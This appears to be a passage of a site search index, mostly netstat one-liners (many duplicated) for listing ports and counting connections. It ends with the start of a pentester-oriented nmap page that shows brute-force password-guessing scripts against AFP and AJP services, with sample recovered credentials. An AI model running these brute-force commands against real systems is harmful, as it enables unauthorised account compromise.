&#1605;&#1581;&#1583;&#1583;"},{"location":"linux/netstat/#display-connections-histogram","text":"netstat -an | grep ESTABLISHED | awk '\\''{print $5}' \\' ' | awk -F: ' \\' '{print $1}' \\' ' | sort | uniq -c | awk ' \\' '{ printf(\"%s\\t%s\\t\",$2,$1); for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\"}' \\' '","title":"Display connections histogram"},{"location":"linux/netstat/#show-apps-that-use-internet-connection-at-the-moment-multi-language","text":"netstat -lantp | grep -i stab | awk -F/ '{print $2}' | sort | uniq","title":"Show apps that use internet connection at the moment. (Multi-Language)"},{"location":"linux/netstat/#show-all-programs-on-udp-and-tcp-ports-with-timer-information","text":"netstat -putona","title":"Show all programs on UDP and TCP ports with timer information"},{"location":"linux/netstat/#examine-processes-generating-traffic-on-your-website","text":"netstat -np | grep -v ^unix","title":"Examine processes generating traffic on your website"},{"location":"linux/netstat/#list-programs-with-open-ports-and-connections","text":"netstat -ntauple","title":"List programs with open ports and connections"},{"location":"linux/netstat/#list-the-number-and-type-of-active-network-connections","text":"netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c","title":"List the number and type of active network connections"},{"location":"linux/netstat/#show-complete-url-in-sh","text":"netstat output ```sh netstat -tup -W | column -t","title":"Show complete URL in ```sh"},{"location":"linux/netstat/#list-listen-port-by-numbers","text":"netstat -tlpn | sort -t: -k2 -n","title":"List Listen Port by numbers"},{"location":"linux/netstat/#sh_2","text":"netstat with group by ip adress ```sh netstat -ntu | awk ' $5 ~ /^[0-9]/ {print $5}' | cut -d: -f1 | sort | uniq -c | sort -n","title":"```sh"},{"location":"linux/netstat/#show-apps-that-use-internet-connection-at-the-moment_1","text":"netstat -lantp | grep -i establ | awk -F/ '{print $2}' | sort | uniq","title":"Show apps that use internet connection at the moment."},{"location":"linux/netstat/#find-an-unused-unprivileged-tcp-port","text":"netstat -atn | awk ' /tcp/ {printf(\"%s\\n\",substr($4,index($4,\":\")+1,length($4) )) }' | sed -e \"s/://g\" | sort -rnu | awk '{array [$1] = $1} END {i=32768; again=1; while (again == 1) {if (array[i] == i) {i=i+1} else {print i; again=0}}}'","title":"find an unused unprivileged TCP port"},{"location":"linux/netstat/#show-in-a-web-server-running-in-the-port-80-how-many-established-connections-by-ip-it-has","text":"netstat -ant | grep :80 | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -n","title":"Show in a web server, running in the port 80, how many ESTABLISHED connections by ip it has."},{"location":"linux/netstat/#sorted-list-of-established-destination-connections_1","text":"netstat | awk '/EST/{print $5}' | sort","title":"Sorted list of established destination connections"},{"location":"linux/netstat/#two-command-output","text":"netstat -n | grep ESTAB | grep :80 | tee /dev/stderr | wc -l","title":"Two command output"},{"location":"linux/netstat/#calulate-established-tcp-connection-of-local-machine","text":"netstat -an | grep -ci \"tcp.*established\"","title":"calulate established tcp connection of local machine"},{"location":"linux/netstat/#most-simple-way-to-get-a-list-of-open-ports","text":"netstat -lnp","title":"Most simple way to get a list of open ports"},{"location":"linux/netstat/#calulate-established-tcp-connection-of-local-machine_1","text":"netstat -an | awk '$1 ~ /[Tt][Cc][Pp]/ && $NF ~ /ESTABLISHED/{i++}END{print \"Connected:\\t\", i}'","title":"calulate established tcp connection of local machine"},{"location":"linux/netstat/#list-all-tcp-opened-ports-on-localhost-in-listen-mode","text":"netstat -nptl","title":"List all TCP opened ports on localhost in LISTEN mode"},{"location":"linux/netstat/#list-top-20-ip-from-which-tcp-connection-is-in-syn_recv-state","text":"netstat -pant 2 > /dev/null | grep SYN_ | awk '{print $5;}' | cut -d: -f1 | sort | uniq -c | sort -n | tail -20","title":"List top 20 IP from which TCP connection is in SYN_RECV state"},{"location":"linux/netstat/#who-has-the-most-apache-connections","text":"netstat -anl | grep :80 | awk '{print $5}' | cut -d \":\" -f 1 | uniq -c | sort -n | grep -c IPHERE","title":"Who has the most Apache connections."},{"location":"linux/netstat/#netstat-connection-check","text":"netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n | tail","title":"Netstat Connection Check"},{"location":"linux/netstat/#show-complete-url-in-sh_1","text":"netstat output ```sh netstat -pnut -W | column -t -s $'\\t'","title":"Show complete URL in ```sh"},{"location":"linux/netstat/#show-what-pid-is-listening-on-port-80-on-linux","text":"netstat -alnp | grep ::80","title":"Show what PID is listening on port 80 on Linux"},{"location":"linux/netstat/#all-ip-connected-to--my-host_1","text":"netstat -lantp | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort -u","title":"All IP connected to  my host"},{"location":"linux/netstat/#get-a-process-list-by-listen-port","text":"netstat -ntlp | grep -w 80 | awk '{print $7}' | cut -d/ -f1","title":"get a process list by listen port"},{"location":"linux/netstat/#ip-addresses-connected-to-port-80","text":"netstat -tn 2 >/dev/null | grep ':80 ' | awk '{print $5}' | sed -e 's/::ffff://' | cut -f1 -d: | sort | uniq -c | sort -rn | head","title":"IP addresses connected to port 80"},{"location":"linux/netstat/#tcp-and-udp-listening-sockets","text":"netstat -t -u -l","title":"TCP and UDP listening sockets"},{"location":"linux/netstat/#the-program-listening-on-port-8080-through-ipv6","text":"netstat -lnp6 | grep :8080 | sed 's#^[^\\/]*/\\([a-z0-9]*\\)#\\1#'","title":"The program listening on port 8080 through IPv6"},{"location":"linux/netstat/#list-ips-with-high-number-of-connections","text":"netstat -tn 2 >/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head","title":"list ips with high number of connections"},{"location":"linux/netstat/#show-all-listening-and-open-server-connections-with-port-number-and-process-namepid","text":"netstat -tulpn","title":"Show all LISTENing and open server connections, with port number and process name/pid"},{"location":"linux/netstat/#show-which-programs-are-listening-on-tcp-and-udp-ports","text":"netstat -plunt","title":"Show which programs are listening on TCP and UDP ports"},{"location":"linux/netstat/#show-all-listening-and-established-ports-tcp-and-udp-together-with-the-pid-of-the-associated-process","text":"netstat -plantu","title":"Show all listening and established ports TCP and UDP together with the PID of the associated process"},{"location":"linux/netstat/#list-current-ssh-clients_1","text":"netstat -tn | awk '($4 ~ /:22\\s*/) && ($6 ~ /^EST/) {print substr($5, 0, index($5,\":\"))}'","title":"list current ssh clients"},{"location":"linux/netstat/#tell-if-a-port-is-in-use","text":"netstat -a numeric-ports | grep 8321","title":"tell if a port is in use"},{"location":"linux/netstat/#lists-all-listening-ports-together-with-the-pid-of-the-associated-process_1","text":"netstat -anpe","title":"Lists all listening ports together with the PID of the associated process"},{"location":"linux/netstat/#number-of-open-connections-per-ip","text":"netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n","title":"Number of open connections per ip."},{"location":"linux/netstat/#find-an-unused-unprivileged-tcp-port_1","text":"netstat -atn | perl -0777 -ne '@ports = /tcp.*?\\:(\\d+)\\s+/imsg ; for $port (32768..61000) {if(!grep(/^$port$/, @ports)) { print $port; last } }'","title":"find an unused unprivileged TCP port"},{"location":"linux/netstat/#find-default-gateway_1","text":"netstat -rn | grep UG | tr -s \" \" | cut -d \" \" -f2","title":"Find default gateway"},{"location":"linux/netstat/#fetch-the-gateway-ip-address","text":"netstat -nr | awk 'BEGIN {while ($3!=\"0.0.0.0\") getline; print $2}'","title":"Fetch the Gateway Ip Address"},{"location":"linux/netstat/#sh_3","text":"netstat with group by (ip adress) ```sh netstat -ntu | awk ' $5 ~ /^(::ffff:|[0-9|])/ { gsub(\"::ffff:\",\"\",$5); print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr","title":"```sh"},{"location":"linux/netstat/#check-open-ports-both-ipv4-and-ipv6_1","text":"netstat -plntu","title":"check open ports (both ipv4 and ipv6)"},{"location":"linux/netstat/#to-find-which-host-made-maximum-number-of-specific-tcp-connections","text":"netstat -n | grep '^tcp.*<IP>:<PORT>' | tr \" \" | awk 'BEGIN{FS=\"( |:)\"}{print $6}' | sort | uniq -c | sort -n -k1 | awk '{if ($1 >= 10){print $2}}'","title":"To find which host made maximum number of specific tcp connections"},{"location":"linux/netstat/#count-tcp-states-from-netstat","text":"netstat -an | awk '/tcp/ {print $6}' | sort | uniq -c","title":"Count TCP States From Netstat"},{"location":"linux/netstat/#to-find-the-ldap-clients-connected-to-ldap-service-running-on-solaris","text":"netstat -n -f inet | awk '/\\.389/{print $2}' | cut -f1-4 -d. | sort -u","title":"To find the LDAP clients connected to LDAP service running on Solaris"},{"location":"linux/netstat/#summarize-the-number-of-open-tcp-connections-by-state","text":"netstat -nt | awk '{print $6}' | sort | uniq -c | sort -n -k 1 -r","title":"Summarize the number of open TCP connections by state"},{"location":"linux/netstat/#calulate-established-tcp-connection-of-local-machine_2","text":"netstat -an | grep -Ec '^tcp.+ESTABLISHED$'","title":"calulate established tcp connection of local machine"},{"location":"linux/netstat/#count-ipv4-connections-per-ip","text":"netstat -anp | grep 'tcp\\|udp' | awk '{print $5}' | sed s/::ffff:// | cut -d: -f1 | sort | uniq -c | sort -n","title":"count IPv4 connections per IP"},{"location":"linux/netstat/#tcp-and-udp-listening-sockets_1","text":"netstat -tunlapo","title":"TCP and UDP listening sockets"},{"location":"linux/netstat/#active-internet-connections-only-servers","text":"netstat -lnptu","title":"Active Internet connections (only servers)"},{"location":"linux/netstat/#open-listening-ports","text":"netstat -ltn | awk -n '/tcp /{ split($4, x, \":\"); print(x[2]); }' | sort -n","title":"open listening ports"},{"location":"linux/netstat/#list-state-of-nat","text":"netstat-nat -n","title":"List state of NAT."},{"location":"linux/netstat/#check-for-listening-services","text":"netstat -tuapen | grep LISTEN","title":"Check for listening services"},{"location":"linux/netstat/#sh_4","text":"netstat with group by (ip adress) ```sh netstat -nt | awk -F\":\" '{print $2}' | sort | uniq -c","title":"```sh"},{"location":"linux/netstat/#graph--of-connections-for-each-hosts","text":"netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | awk '{ printf(\"%s\\t%s\\t\",$2,$1) ; for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\" }'","title":"Graph # of connections for each hosts."},{"location":"linux/netstat/#graph--of-connections-for-each-hosts_1","text":"netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | awk '{ printf(\"%s\\t%s\\t\",$2,$1) ; for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\" }'","title":"Graph # of connections for each hosts."},{"location":"linux/netstat/#find-out-if-mysql-is-up-and-listening-on-linux","text":"netstat -tap | grep mysql","title":"Find out if MySQL is up and listening on Linux"},{"location":"linux/netstat/#get-the-ip-connected-to-the-server-usefull-to-detect-ip-that-should-be-blocked","text":"netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n","title":"get the IP connected to the server (usefull to detect IP that should be blocked)"},{"location":"linux/netstat/#netstat-established","text":"netstat | find \"ESTABLISHED\"","title":"NETSTAT ESTABLISHED"},{"location":"linux/netstat/#monitor-all-open-connections-to-specific-port","text":"netstat -anp | grep \":<port>\"","title":"monitor all open connections to specific port"},{"location":"linux/netstat/#check-if-tcp-port-25-is-open_1","text":"netstat -tln | grep :25","title":"Check if TCP port 25 is open"},{"location":"linux/netstat/#command-results-as-an-image-capture","text":"netstat -rn | convert label:@- netstat.png","title":"Command results as an image capture"},{"location":"linux/netstat/#list-open-tcpudp-ports","text":"netstat -anp tcp udp | grep LISTEN","title":"List open TCP/UDP ports"},{"location":"linux/netstat/#show-number-of-connections-per-remote-ip_1","text":"netstat -antu | awk '$5 ~ /[0-9]:/{split($5, a, \":\"); ips[a[1]]++} END {for (ip in ips) print ips[ip], ip | \"sort -k1 -nr\"}'","title":"Show number of connections per remote IP"},{"location":"linux/netstat/#list-open-tcpudp-ports_1","text":"netstat -ltun","title":"List open TCP/UDP ports"},{"location":"linux/netstat/#netstat-list-out-remote-ips-connected-to-server-only","text":"netstat -tn | awk '{print $5}' | egrep -v '(localhost|\\*\\:\\*|Address|and|servers|fff|127\\.0\\.0)' | sed 's/:[0-99999999].*//g'","title":"Netstat List out Remote IP's Connected to Server Only"},{"location":"linux/netstat/#find-out-which-tcp-ports-are-listening-and-opened-by-which-process-in-verbose","text":"netstat -tlvp","title":"find out which TCP ports are listening and opened by which process in verbose"},{"location":"linux/netstat/#find-an-unused-unprivileged-tcp-port_2","text":"netstat -tan | awk '$1 == \"tcp\" && $4 ~ /:/ { port=$4; sub(/^[^:]+:/, \"\", port); used[int(port)] = 1; } END { for (p = 32768; p <= 61000; ++p) if (! (p in used)) { print p; exit(0); }; exit(1); }'","title":"find an unused unprivileged TCP port"},{"location":"linux/netstat/#showing-opened-ports-on-machine","text":"netstat -tulpnc","title":"showing opened ports on machine"},{"location":"linux/netstat/#find-an-unused-unprivileged-tcp-port_3","text":"netstat -atn | perl -ane 'if ( $F[3] =~ /(\\d+)$/ ) { $x{$1}=1 } END{ print( (grep {!$x{$_}} 32768..61000)[0] . \"\\n\" )}'","title":"find an unused unprivileged TCP port"},{"location":"linux/netstat/#lists-open-ports","text":"netstat -antuwp | egrep \"(^[^t])|(^tcp.*LISTEN)\"","title":"Lists open ports"},{"location":"linux/netstat/#number-of-connections-per-ip-with-range-24","text":"netstat -tn | grep :80 | awk '{print $5}' | grep -v ':80' | cut -f1 -d: | cut -f1,2,3 -d. | sort | uniq -c | sort -n","title":"Number of connections per IP with range 24"},{"location":"linux/netstat/#check-the-connection-of-the-maximum-number-of-ip","text":"netstat -na | grep ESTABLISHED | awk '{print$5}' | awk -F : '{print$1}' | sort | uniq -c | sort -r","title":"Check the connection of the maximum number of IP"},{"location":"linux/netstat/#detect-connections-on-port---android","text":"netstat -lptu | grep -E \"22.*ESTABLISHED\" | cut -s -d ':' -f2 | awk '{print $2}'","title":"Detect Connections On Port - Android"},{"location":"linux/netstat/#how-to-kill-process-that-is-running-on-certain-port-in-windows","text":"netstat -a -o -n | grep 8080","title":"How to Kill Process that is Running on Certain Port in Windows?"},{"location":"linux/netstat/#list-all-ips-connected-to-port-80","text":"netstat -tn 2 >/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head","title":"List all IP's connected to port 80"},{"location":"linux/netstat/#see-who-are-using-a-specific-port","text":"netstat -Aan | grep .80 | grep -v 127 .0.0.1 | grep EST | awk '{print $6}' | cut -d \".\" -f1,2,3,4 | sort | uniq","title":"See who are using a specific port"},{"location":"linux/netstat/#equivalent-to-ifconfig--a-in-hpux_1","text":"netstat -in","title":"Equivalent to ifconfig -a in HPUX"},{"location":"linux/netstat/#print-whois-info-about-connected-ip-addresses","text":"netstat -np inet | awk '/firefox/{split($5,a,\":\");z[a[1]]++} END{for(i in z){system(\"whois \" i)}}' | less","title":"Print whois info about connected ip addresses"},{"location":"linux/netstat/#all-ip-connected-to--my-host_2","text":"netstat -nut | sed '/ESTABLISHED/!d;s/.*[\\t ]\\+\\(.*\\):.*/\\1/' | sort -u","title":"All IP connected to  my host"},{"location":"linux/netstat/#number-of-open-connections-per-ip_1","text":"netstat -an | grep 80 | wc -l","title":"Number of open connections per ip."},{"location":"linux/netstat/#quick-network-status-of-machine_1","text":"netstat -tn | awk 'NR>2 {print $6}' | sort | uniq -c | sort -rn","title":"Quick network status of machine"},{"location":"linux/netstat/#see-keepalive-counters-on-tcp-connections_1","text":"netstat -town","title":"See KeepAlive counters on tcp connections"},{"location":"linux/netstat/#check-open-ports-both-ipv4-and-ipv6_2","text":"netstat -plnt","title":"check open ports (both ipv4 and ipv6)"},{"location":"linux/netstat/#see-the-time_wait-and-established-nums-of-the-network_1","text":"netstat -n | awk '/^tcp/ {++B[$NF]} END {for(a in B) print a, B[a]}'","title":"see the TIME_WAIT and ESTABLISHED nums of the network"},{"location":"linux/netstat/#display-connections-histogram_1","text":"netstat -an | grep ESTABLISHED | awk '\\''{print $5}' \\' ' | awk -F: ' \\' '{print $1}' \\' ' | sort | uniq -c | awk ' \\' '{ printf(\"%s\\t%s\\t\",$2,$1); for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\"}' \\' '","title":"Display connections histogram"},{"location":"linux/netstat/#show-apps-that-use-internet-connection-at-the-moment-multi-language_1","text":"netstat -lantp | grep -i stab | awk -F/ '{print $2}' | sort | uniq","title":"Show apps that use internet connection at the moment. (Multi-Language)"},{"location":"linux/netstat/#show-all-programs-on-udp-and-tcp-ports-with-timer-information_1","text":"netstat -putona","title":"Show all programs on UDP and TCP ports with timer information"},{"location":"linux/netstat/#examine-processes-generating-traffic-on-your-website_1","text":"netstat -np | grep -v ^unix","title":"Examine processes generating traffic on your website"},{"location":"linux/netstat/#list-programs-with-open-ports-and-connections_1","text":"netstat -ntauple","title":"List programs with open ports and connections"},{"location":"linux/netstat/#list-the-number-and-type-of-active-network-connections_1","text":"netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c","title":"List the number and type of active network connections"},{"location":"linux/netstat/#show-complete-url-in-sh_2","text":"netstat output ```sh netstat -tup -W | column -t","title":"Show complete URL in ```sh"},{"location":"linux/netstat/#list-listen-port-by-numbers_1","text":"netstat -tlpn | sort -t: -k2 -n","title":"List Listen Port by numbers"},{"location":"linux/netstat/#sh_5","text":"netstat with group by ip adress ```sh netstat -ntu | awk ' $5 ~ /^[0-9]/ {print $5}' | cut -d: -f1 | sort | uniq -c | sort -n","title":"```sh"},{"location":"linux/netstat/#show-apps-that-use-internet-connection-at-the-moment_2","text":"netstat -lantp | grep -i establ | awk -F/ '{print $2}' | sort | uniq","title":"Show apps that use internet connection at the moment."},{"location":"linux/netstat/#find-an-unused-unprivileged-tcp-port_4","text":"netstat -atn | awk ' /tcp/ {printf(\"%s\\n\",substr($4,index($4,\":\")+1,length($4) )) }' | sed -e \"s/://g\" | sort -rnu | awk '{array [$1] = $1} END {i=32768; again=1; while (again == 1) {if (array[i] == i) {i=i+1} else {print i; again=0}}}'","title":"find an unused unprivileged TCP port"},{"location":"linux/netstat/#show-in-a-web-server-running-in-the-port-80-how-many-established-connections-by-ip-it-has_1","text":"netstat -ant | grep :80 | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -n","title":"Show in a web server, running in the port 80, how many ESTABLISHED connections by ip it has."},{"location":"linux/netstat/#sorted-list-of-established-destination-connections_2","text":"netstat | awk '/EST/{print $5}' | sort","title":"Sorted list of established destination connections"},{"location":"linux/netstat/#two-command-output_1","text":"netstat -n | grep ESTAB | grep :80 | tee /dev/stderr | wc -l","title":"Two command output"},{"location":"linux/netstat/#calulate-established-tcp-connection-of-local-machine_3","text":"netstat -an | grep -ci \"tcp.*established\"","title":"calulate established tcp connection of local machine"},{"location":"linux/netstat/#most-simple-way-to-get-a-list-of-open-ports_1","text":"netstat -lnp","title":"Most simple way to get a list of open ports"},{"location":"linux/netstat/#calulate-established-tcp-connection-of-local-machine_4","text":"netstat -an | awk '$1 ~ /[Tt][Cc][Pp]/ && $NF ~ /ESTABLISHED/{i++}END{print \"Connected:\\t\", i}'","title":"calulate established tcp connection of local machine"},{"location":"linux/netstat/#list-all-tcp-opened-ports-on-localhost-in-listen-mode_1","text":"netstat -nptl","title":"List all TCP opened ports on localhost in LISTEN mode"},{"location":"linux/netstat/#list-top-20-ip-from-which-tcp-connection-is-in-syn_recv-state_1","text":"netstat -pant 2 > /dev/null | grep SYN_ | awk '{print $5;}' | cut -d: -f1 | sort | uniq -c | sort -n | tail -20","title":"List top 20 IP from which TCP connection is in SYN_RECV state"},{"location":"linux/netstat/#who-has-the-most-apache-connections_1","text":"netstat -anl | grep :80 | awk '{print $5}' | cut -d \":\" -f 1 | uniq -c | sort -n | grep -c IPHERE","title":"Who has the most Apache connections."},{"location":"linux/netstat/#netstat-connection-check_1","text":"netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n | tail","title":"Netstat Connection Check"},{"location":"linux/netstat/#show-complete-url-in-sh_3","text":"netstat output ```sh netstat -pnut -W | column -t -s $'\\t'","title":"Show complete URL in ```sh"},{"location":"linux/netstat/#show-what-pid-is-listening-on-port-80-on-linux_1","text":"netstat -alnp | grep ::80","title":"Show what PID is listening on port 80 on Linux"},{"location":"linux/netstat/#all-ip-connected-to--my-host_3","text":"netstat -lantp | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort -u","title":"All IP connected to  my host"},{"location":"linux/netstat/#get-a-process-list-by-listen-port_1","text":"netstat -ntlp | grep -w 80 | awk '{print $7}' | cut -d/ -f1","title":"get a process list by listen port"},{"location":"linux/netstat/#ip-addresses-connected-to-port-80_1","text":"netstat -tn 2 >/dev/null | grep ':80 ' | awk '{print $5}' | sed -e 's/::ffff://' | cut -f1 -d: | sort | uniq -c | sort -rn | head","title":"IP addresses connected to port 80"},{"location":"linux/netstat/#tcp-and-udp-listening-sockets_2","text":"netstat -t -u -l","title":"TCP and UDP listening sockets"},{"location":"linux/netstat/#the-program-listening-on-port-8080-through-ipv6_1","text":"netstat -lnp6 | grep :8080 | sed 's#^[^\\/]*/\\([a-z0-9]*\\)#\\1#'","title":"The program listening on port 8080 through IPv6"},{"location":"linux/netstat/#list-ips-with-high-number-of-connections_1","text":"netstat -tn 2 >/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head","title":"list ips with high number of connections"},{"location":"linux/netstat/#show-all-listening-and-open-server-connections-with-port-number-and-process-namepid_1","text":"netstat -tulpn","title":"Show all LISTENing and open server connections, with port number and process name/pid"},{"location":"linux/netstat/#show-which-programs-are-listening-on-tcp-and-udp-ports_1","text":"netstat -plunt","title":"Show which programs are listening on TCP and UDP ports"},{"location":"linux/netstat/#show-all-listening-and-established-ports-tcp-and-udp-together-with-the-pid-of-the-associated-process_1","text":"netstat -plantu","title":"Show all listening and established ports TCP and UDP together with the PID of the associated process"},{"location":"linux/netstat/#list-current-ssh-clients_2","text":"netstat -tn | awk '($4 ~ /:22\\s*/) && ($6 ~ /^EST/) {print substr($5, 0, index($5,\":\"))}'","title":"list current ssh clients"},{"location":"linux/netstat/#tell-if-a-port-is-in-use_1","text":"netstat -a numeric-ports | grep 8321","title":"tell if a port is in use"},{"location":"linux/netstat/#lists-all-listening-ports-together-with-the-pid-of-the-associated-process_2","text":"netstat -anpe","title":"Lists all listening ports together with the PID of the associated process"},{"location":"linux/netstat/#number-of-open-connections-per-ip_2","text":"netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n","title":"Number of open connections per ip."},{"location":"linux/netstat/#find-an-unused-unprivileged-tcp-port_5","text":"netstat -atn | perl -0777 -ne '@ports = /tcp.*?\\:(\\d+)\\s+/imsg ; for $port (32768..61000) {if(!grep(/^$port$/, @ports)) { print $port; last } }'","title":"find an unused unprivileged TCP port"},{"location":"linux/netstat/#find-default-gateway_2","text":"netstat -rn | grep UG | tr -s \" \" | cut -d \" \" -f2","title":"Find default gateway"},{"location":"linux/netstat/#fetch-the-gateway-ip-address_1","text":"netstat -nr | awk 'BEGIN {while ($3!=\"0.0.0.0\") getline; print $2}'","title":"Fetch the Gateway Ip Address"},{"location":"linux/netstat/#sh_6","text":"netstat with group by (ip adress) ```sh netstat -ntu | awk ' $5 ~ /^(::ffff:|[0-9|])/ { gsub(\"::ffff:\",\"\",$5); print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr","title":"```sh"},{"location":"linux/netstat/#check-open-ports-both-ipv4-and-ipv6_3","text":"netstat -plntu","title":"check open ports (both ipv4 and ipv6)"},{"location":"linux/netstat/#to-find-which-host-made-maximum-number-of-specific-tcp-connections_1","text":"netstat -n | grep '^tcp.*<IP>:<PORT>' | tr \" \" | awk 'BEGIN{FS=\"( |:)\"}{print $6}' | sort | uniq -c | sort -n -k1 | awk '{if ($1 >= 10){print $2}}'","title":"To find which host made maximum number of specific tcp connections"},{"location":"linux/netstat/#count-tcp-states-from-netstat_1","text":"netstat -an | awk '/tcp/ {print $6}' | sort | uniq -c","title":"Count TCP States From Netstat"},{"location":"linux/netstat/#to-find-the-ldap-clients-connected-to-ldap-service-running-on-solaris_1","text":"netstat -n -f inet | awk '/\\.389/{print $2}' | cut -f1-4 -d. | sort -u","title":"To find the LDAP clients connected to LDAP service running on Solaris"},{"location":"linux/netstat/#summarize-the-number-of-open-tcp-connections-by-state_1","text":"netstat -nt | awk '{print $6}' | sort | uniq -c | sort -n -k 1 -r","title":"Summarize the number of open TCP connections by state"},{"location":"linux/netstat/#calulate-established-tcp-connection-of-local-machine_5","text":"netstat -an | grep -Ec '^tcp.+ESTABLISHED$'","title":"calulate established tcp connection of local machine"},{"location":"linux/netstat/#count-ipv4-connections-per-ip_1","text":"netstat -anp | grep 'tcp\\|udp' | awk '{print $5}' | sed s/::ffff:// | cut -d: -f1 | sort | uniq -c | sort -n","title":"count IPv4 connections per IP"},{"location":"linux/netstat/#tcp-and-udp-listening-sockets_3","text":"netstat -tunlapo","title":"TCP and UDP listening sockets"},{"location":"linux/netstat/#active-internet-connections-only-servers_1","text":"netstat -lnptu","title":"Active Internet connections (only servers)"},{"location":"linux/netstat/#open-listening-ports_1","text":"netstat -ltn | awk -n '/tcp /{ split($4, x, \":\"); print(x[2]); }' | sort -n","title":"open listening ports"},{"location":"linux/netstat/#list-state-of-nat_1","text":"netstat-nat -n","title":"List state of NAT."},{"location":"linux/netstat/#check-for-listening-services_1","text":"netstat -tuapen | grep LISTEN","title":"Check for listening services"},{"location":"linux/netstat/#sh_7","text":"netstat with group by (ip adress) ```sh netstat -nt | awk -F\":\" '{print $2}' | sort | uniq -c","title":"```sh"},{"location":"linux/netstat/#graph--of-connections-for-each-hosts_2","text":"netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | awk '{ printf(\"%s\\t%s\\t\",$2,$1) ; for (i = 0; i < $1; i++) {printf(\"*\")}; print \"\" }'","title":"Graph # of connections for each hosts."},{"location":"linux/netstat/#find-out-if-mysql-is-up-and-listening-on-linux_1","text":"netstat -tap | grep mysql","title":"Find out if MySQL is up and listening on Linux"},{"location":"linux/netstat/#get-the-ip-connected-to-the-server-usefull-to-detect-ip-that-should-be-blocked_1","text":"netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n","title":"get the IP connected to the server (usefull to detect IP that should be blocked)"},{"location":"linux/netstat/#netstat-established_1","text":"netstat | find \"ESTABLISHED\"","title":"NETSTAT ESTABLISHED"},{"location":"linux/netstat/#monitor-all-open-connections-to-specific-port_1","text":"netstat -anp | grep \":<port>\"","title":"monitor all open connections to specific port"},{"location":"linux/netstat/#check-if-tcp-port-25-is-open_2","text":"netstat -tln | grep :25","title":"Check if TCP port 25 is open"},{"location":"linux/netstat/#command-results-as-an-image-capture_1","text":"netstat -rn | convert label:@- netstat.png","title":"Command results as an image capture"},{"location":"linux/netstat/#list-open-tcpudp-ports_2","text":"netstat -anp tcp udp | grep LISTEN","title":"List open TCP/UDP ports"},{"location":"linux/netstat/#show-number-of-connections-per-remote-ip_2","text":"netstat -antu | awk '$5 ~ /[0-9]:/{split($5, a, \":\"); ips[a[1]]++} END {for (ip in ips) print ips[ip], ip | \"sort -k1 -nr\"}'","title":"Show number of connections per remote IP"},{"location":"linux/netstat/#list-open-tcpudp-ports_3","text":"netstat -ltun","title":"List open TCP/UDP ports"},{"location":"linux/netstat/#netstat-list-out-remote-ips-connected-to-server-only_1","text":"netstat -tn | awk '{print $5}' | egrep -v '(localhost|\\*\\:\\*|Address|and|servers|fff|127\\.0\\.0)' | sed 's/:[0-99999999].*//g'","title":"Netstat List out Remote IP's Connected to Server Only"},{"location":"linux/netstat/#find-out-which-tcp-ports-are-listening-and-opened-by-which-process-in-verbose_1","text":"netstat -tlvp","title":"find out which TCP ports are listening and opened by which process in verbose"},{"location":"linux/netstat/#find-an-unused-unprivileged-tcp-port_6","text":"netstat -tan | awk '$1 == \"tcp\" && $4 ~ /:/ { port=$4; sub(/^[^:]+:/, \"\", port); used[int(port)] = 1; } END { for (p = 32768; p <= 61000; ++p) if (! (p in used)) { print p; exit(0); }; exit(1); }'","title":"find an unused unprivileged TCP port"},{"location":"linux/netstat/#showing-opened-ports-on-machine_1","text":"netstat -tulpnc","title":"showing opened ports on machine"},{"location":"linux/netstat/#find-an-unused-unprivileged-tcp-port_7","text":"netstat -atn | perl -ane 'if ( $F[3] =~ /(\\d+)$/ ) { $x{$1}=1 } END{ print( (grep {!$x{$_}} 32768..61000)[0] . \"\\n\" )}'","title":"find an unused unprivileged TCP port"},{"location":"linux/netstat/#lists-open-ports_1","text":"netstat -antuwp | egrep \"(^[^t])|(^tcp.*LISTEN)\"","title":"Lists open ports"},{"location":"linux/netstat/#number-of-connections-per-ip-with-range-24_1","text":"netstat -tn | grep :80 | awk '{print $5}' | grep -v ':80' | cut -f1 -d: | cut -f1,2,3 -d. | sort | uniq -c | sort -n","title":"Number of connections per IP with range 24"},{"location":"linux/netstat/#check-the-connection-of-the-maximum-number-of-ip_1","text":"netstat -na | grep ESTABLISHED | awk '{print$5}' | awk -F : '{print$1}' | sort | uniq -c | sort -r","title":"Check the connection of the maximum number of IP"},{"location":"linux/nmap/","text":"nmap As a pentester, we must understand and know what this extremely powerful tool is capable of, it can do SO Much more then just scanning ports ;-) After you installed nmap go get all scripts by below command: nmap --script-updatedb AFP - Brute-Force Performs password guessing against Apple Filing Protocol (AFP) nmap -p 548 --script afp-brute 192.168.1.12 |PORT STATE SERVICE |548/tcp open afp | afp-brute: |_ admin:KenSentMe => Valid credentials AJP - Brute-Force Performs brute force passwords auditing against the Apache JServ protocol. The Apache JServ Protocol is commonly used by web servers to communicate with back-end Java application server containers nmap -p 8009 192.168.1.12 --script ajp-brute |PORT STATE SERVICE |8009/tcp open ajp13 | ajp-brute: | Accounts | 